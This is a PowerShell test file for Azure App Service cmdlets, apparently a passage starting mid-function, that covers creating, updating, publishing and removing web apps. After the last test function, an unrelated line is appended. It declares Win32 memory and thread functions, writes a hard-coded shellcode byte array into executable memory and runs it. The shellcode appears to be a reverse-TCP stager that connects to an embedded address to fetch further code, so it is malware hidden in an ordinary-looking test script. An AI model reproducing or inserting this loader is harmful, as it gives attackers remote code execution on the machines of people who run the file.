	$aseName = "mnASE"
	$resourceType = "Microsoft.Web/sites"
	try
	{
		
		$serverFarm = Get-AzAppServicePlan -ResourceGroupName $rgname -Name  $whpName

		
		$job = New-AzWebApp -ResourceGroupName $rgname -Name $wname -Location $location -AppServicePlan $whpName -AseName $aseName -AsJob
		$job | Wait-Job
		$actual = $job | Receive-Job
		
		
		Assert-AreEqual $wname $actual.Name
		Assert-AreEqual $serverFarm.Id $actual.ServerFarmId

		
		$result = Get-AzWebApp -ResourceGroupName $rgname -Name $wname
		
		
		Assert-AreEqual $wname $result.Name
		Assert-AreEqual $serverFarm.Id $result.ServerFarmId
	}
	finally
	{
		
		Remove-AzWebApp -ResourceGroupName $rgname -Name $wname -Force
	}
}


function Test-SetWebApp
{
	
	$rgname = Get-ResourceGroupName
	$webAppName = Get-WebsiteName
	$location = Get-WebLocation
	$appServicePlanName1 = Get-WebHostPlanName
	$appServicePlanName2 = Get-WebHostPlanName
	$tier1 = "Shared"
	$tier2 = "Standard"
	$apiversion = "2015-08-01"
	$resourceType = "Microsoft.Web/sites"
	$capacity = 2

	try
	{
		
		New-AzResourceGroup -Name $rgname -Location $location
		$serverFarm1 = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $appServicePlanName1 -Location  $location -Tier $tier1
		$serverFarm2 = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $appServicePlanName2 -Location  $location -Tier $tier2
		
		
		$webApp = New-AzWebApp -ResourceGroupName $rgname -Name $webAppName -Location $location -AppServicePlan $appServicePlanName1 
		Write-Debug "DEBUG: Created the Web App"

		
		Assert-AreEqual $webAppName $webApp.Name
		Assert-AreEqual $serverFarm1.Id $webApp.ServerFarmId
		Assert-Null $webApp.Identity
		Assert-NotNull $webApp.SiteConfig.phpVersion
		
		
		$job = Set-AzWebApp -ResourceGroupName $rgname -Name $webAppName -AppServicePlan $appServicePlanName2 -HttpsOnly $true -AsJob
		$job | Wait-Job
		$webApp = $job | Receive-Job

		Write-Debug "DEBUG: Changed service plan"

		
		Assert-AreEqual $webAppName $webApp.Name
		Assert-AreEqual $serverFarm2.Id $webApp.ServerFarmId
		Assert-AreEqual $true $webApp.HttpsOnly

		
		$webapp.SiteConfig.HttpLoggingEnabled = $true
		$webapp.SiteConfig.RequestTracingEnabled = $true

		
		$webApp = $webApp | Set-AzWebApp

		Write-Debug "DEBUG: Changed site properties"

		
		Assert-AreEqual $webAppName $webApp.Name
		Assert-AreEqual $serverFarm2.Id $webApp.ServerFarmId
		Assert-AreEqual $true $webApp.SiteConfig.HttpLoggingEnabled
		Assert-AreEqual $true $webApp.SiteConfig.RequestTracingEnabled

		$appSettings = @{ "setting1" = "valueA"; "setting2" = "valueB"}
		$connectionStrings = @{ connstring1 = @{ Type="MySql"; Value="string value 1"}; connstring2 = @{ Type = "SQLAzure"; Value="string value 2"}}

        
        $webApp = Set-AzWebApp -ResourceGroupName $rgname -Name $webAppName -AppSettings $appSettings -AssignIdentity $true

        
        Assert-NotNull  $webApp.Identity
        
        Assert-AreEqual ($appSettings.Keys.Count) $webApp.SiteConfig.AppSettings.Count
        Assert-NotNull  $webApp.Identity

        
		$webApp = Set-AzWebApp -ResourceGroupName $rgname -Name $webAppName -AppSettings $appSettings -ConnectionStrings $connectionStrings -NumberofWorkers $capacity -PhpVersion "off"

		
		Assert-AreEqual $webAppName $webApp.Name
        foreach($nvp in $webApp.SiteConfig.AppSettings)
		{
			Assert-True { $appSettings.Keys -contains $nvp.Name }
			Assert-True { $appSettings[$nvp.Name] -match $nvp.Value }
		}
		Assert-AreEqual $connectionStrings.Keys.Count $webApp.SiteConfig.ConnectionStrings.Count
		foreach($connStringInfo in $webApp.SiteConfig.ConnectionStrings)
		{
			Assert-True { $connectionStrings.Keys -contains $connStringInfo.Name }
		}

		Assert-AreEqual $capacity $webApp.SiteConfig.NumberOfWorkers
		Assert-AreEqual "" $webApp.SiteConfig.PhpVersion

	}
	finally
	{
		
		Remove-AzWebApp -ResourceGroupName $rgname -Name $webAppName -Force
		Remove-AzAppServicePlan -ResourceGroupName $rgname -Name  $appServicePlanName1 -Force
		Remove-AzAppServicePlan -ResourceGroupName $rgname -Name  $appServicePlanName2 -Force
		Remove-AzResourceGroup -Name $rgname -Force
	}
}


function Test-RemoveWebApp
{
	
	$rgname = Get-ResourceGroupName
	$appName = Get-WebsiteName
	$location = Get-WebLocation
	$planName = Get-WebHostPlanName
	$tier = "Shared"
	$apiversion = "2015-08-01"
	$resourceType = "Microsoft.Web/sites"

	try
	{
		
		New-AzResourceGroup -Name $rgname -Location $location
		$serverFarm = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName -Location  $location -Tier $tier
		
		
		$webapp = New-AzWebApp -ResourceGroupName $rgname -Name $appName -Location $location -AppServicePlan $planName
		
		
		Assert-AreEqual $appName $webapp.Name
		Assert-AreEqual $serverFarm.Id $webapp.ServerFarmId

		
		$webapp | Remove-AzWebApp -Force -AsJob | Wait-Job

		
		
		
		
		$webappNames = (Get-AzWebApp -ResourceGroupName $rgname) | Select -Property Name

		Assert-False { $webappNames -contains $appName }
	}
	finally
	{
		
		Remove-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName -Force
		Remove-AzResourceGroup -Name $rgname -Force
	}
}


function Test-WebAppPublishingProfile
{
	
	$rgname = Get-ResourceGroupName
	$appName = Get-WebsiteName
	$location = Get-WebLocation
	$planName = Get-WebHostPlanName
	$tier = "Shared"
	$apiversion = "2015-08-01"
	$resourceType = "Microsoft.Web/sites"
	$profileFileName = "profile.xml"

	try
	{
		
		New-AzResourceGroup -Name $rgname -Location $location
		$serverFarm = New-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName -Location  $location -Tier $tier
		
		
		$webapp = New-AzWebApp -ResourceGroupName $rgname -Name $appName -Location $location -AppServicePlan $planName 
		
		
		Assert-AreEqual $appName $webapp.Name
		Assert-AreEqual $serverFarm.Id $webapp.ServerFarmId

		
		[xml]$profile = Get-AzWebAppPublishingProfile -ResourceGroupName $rgname -Name $appName -OutputFile $profileFileName
		$msDeployProfile = $profile.publishData.publishProfile | ? { $_.publishMethod -eq 'MSDeploy' } | Select -First 1
		$pass = $msDeployProfile.userPWD

		
		Assert-True { $msDeployProfile.msdeploySite -eq $appName }

		
		$newPass = $webapp | Reset-AzWebAppPublishingProfile 

		
		Assert-False { $pass -eq $newPass }

		
		[xml]$profile = $webapp | Get-AzWebAppPublishingProfile -OutputFile $profileFileName -Format FileZilla3
		$fileZillaProfile = $profile.FileZilla3.Servers.Server

		
		Assert-True { $fileZillaProfile.Name -eq $appName }

		
		[xml]$profile = Get-AzWebAppPublishingProfile -ResourceGroupName $rgname -Name $appName

		
		Assert-NotNull $profile

	}
	finally
	{
		
		Remove-AzWebApp -ResourceGroupName $rgname -Name $appName -Force
		Remove-AzAppServicePlan -ResourceGroupName $rgname -Name  $planName -Force
		Remove-AzResourceGroup -Name $rgname -Force
	}
}

function Test-PublishAzureWebAppFromZip
{
	
	$rgname = Get-ResourceGroupName
	$appName = Get-WebsiteName
	$location = Get-WebLocation
	$planName = Get-WebHostPlanName
	$tier = "Shared"

	try
	{
		
		New-AzureRmResourceGroup -Name $rgname -Location $location
		$serverFarm = New-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $planName -Location  $location -Tier $tier
		
		
		$webapp = New-AzureRmWebApp -ResourceGroupName $rgname -Name $appName -Location $location -AppServicePlan $planName 
		
		$zipPath = Join-Path $ResourcesPath "nodejs-sample.zip"
		$publishedApp = Publish-AzWebApp -ResourceGroupName $rgname -Name $appName -ArchivePath $zipPath -Force

		Assert-NotNull $publishedApp
	}
	finally
	{
		
		Remove-AzureRmResourceGroup -Name $rgname -Force
	}
}

function Test-PublishAzureWebAppFromWar
{
	
	$rgname = Get-ResourceGroupName
	$appName = Get-WebsiteName
	$location = Get-WebLocation
	$planName = Get-WebHostPlanName
	$tier = "Shared"

	try
	{
		
		New-AzureRmResourceGroup -Name $rgname -Location $location
		$serverFarm = New-AzureRmAppServicePlan -ResourceGroupName $rgname -Name  $planName -Location  $location -Tier $tier
		
		
		$webapp = New-AzureRmWebApp -ResourceGroupName $rgname -Name $appName -Location $location -AppServicePlan $planName 
		
		$warPath = Join-Path $ResourcesPath "HelloJava.war"
		$publishedApp = Publish-AzWebApp -ResourceGroupName $rgname -Name $appName -ArchivePath $warPath -Force

		Assert-NotNull $publishedApp
	}
	finally
	{
		
		Remove-AzureRmResourceGroup -Name $rgname -Force
	}
}


function Test-CreateNewWebAppSimple
{
	$appName = Get-WebsiteName
	try
	{
		$webapp = New-AzWebApp -Name $appName

		Assert-AreEqual $appName $webapp.Name
	}
	finally
	{
		Remove-AzResourceGroup $appName
	}
}


function Test-TagsNotRemovedBySetWebApp
{
	$rgname = "lketmtestantps10"
	$appname = "tagstestantps10" 
	$slot = "testslot"
	$aspName = "tagstestAspantps10"
	$aspToMove = "tagstestAsp2antps10"

	$getApp =  Get-AzWebApp -ResourceGroupName $rgname -Name $appname
	$getSlot = Get-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slot
	Assert-notNull $getApp.Tags
	Assert-notNull $getSlot.Tags

	
	$webApp = Set-AzWebApp -ResourceGroupName $rgname -Name $appname -HttpsOnly $true
	$slot = Set-AzWebAppSlot -ResourceGroupName $rgname -Name $appname -Slot $slot -HttpsOnly $true

	Assert-AreEqual $true $webApp.HttpsOnly
	Assert-AreEqual $true $slot.HttpsOnly

	Assert-notNull $webApp.Tags
	Assert-notNull $slot.Tags

	
	$webapp =  Set-AzWebApp  -WebApp $getApp
	Assert-notNull $webApp.Tags

	$webapp = Set-AzWebApp -Name $appname -ResourceGroupName $rgname -AppServicePlan $aspToMove
	
	$asp = Get-AzAppServicePlan -ResourceGroupName $rgname -Name $aspToMove
	Assert-AreEqual $webApp.ServerFarmId $asp.id
	
	Assert-notNull $webApp.Tags

	
	$webApp = Set-AzWebApp -Name $appname -ResourceGroupName $rgname -AppServicePlan $aspName
	$asp = Get-AzAppServicePlan -ResourceGroupName $rgname -Name $aspName
	Assert-AreEqual $webApp.ServerFarmId $asp.id
	Assert-notNull $webApp.Tags
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x66,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

